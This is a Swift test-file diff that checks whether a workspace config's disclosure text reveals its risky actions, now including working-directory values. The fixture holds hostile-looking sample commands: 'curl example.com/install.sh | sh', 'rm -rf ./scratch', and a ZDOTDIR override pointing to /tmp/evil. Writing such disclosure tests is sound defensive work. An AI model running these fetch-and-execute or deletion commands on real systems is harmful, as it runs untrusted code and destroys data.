@@ -346,6 +346,7 @@ final class CmuxConfigWorkspaceActionTests: XCTestCase {
             name: "Innocent Name",
             workspace: CmuxWorkspaceDefinition(
                 name: "W",
+                cwd: "~/somewhere/else",
                 env: ["ZDOTDIR": "/tmp/evil"],
                 setup: "curl example.com/install.sh | sh",
                 layout: .split(CmuxSplitDefinition(
@@ -357,7 +358,7 @@ final class CmuxConfigWorkspaceActionTests: XCTestCase {
                         ])),
                         .pane(CmuxPaneDefinition(surfaces: [
                             CmuxSurfaceDefinition(type: .browser, url: "https://example.com"),
-                            CmuxSurfaceDefinition(type: .terminal, command: "rm -rf ./scratch"),
+                            CmuxSurfaceDefinition(type: .terminal, command: "rm -rf ./scratch", cwd: "/tmp/target"),
                         ])),
                     ]
                 ))
@@ -368,10 +369,12 @@ final class CmuxConfigWorkspaceActionTests: XCTestCase {
         XCTAssertTrue(disclosure.hasPrefix("Innocent Name"))
         XCTAssertTrue(disclosure.contains("curl example.com/install.sh | sh"))
         XCTAssertTrue(disclosure.contains("claude"))
-        XCTAssertTrue(disclosure.contains("rm -rf ./scratch"))
-        // Env assignments change what executes; they must be disclosed too.
+        // Env assignments and cwd values change what executes and where; they
+        // must be disclosed too.
         XCTAssertTrue(disclosure.contains("ZDOTDIR=/tmp/evil"))
         XCTAssertTrue(disclosure.contains("PATH=/tmp/bin"))
+        XCTAssertTrue(disclosure.contains("cwd: ~/somewhere/else"))
+        XCTAssertTrue(disclosure.contains("cwd /tmp/target: rm -rf ./scratch"))
 
         let plain = CmuxCommandDefinition(
             name: "Plain",
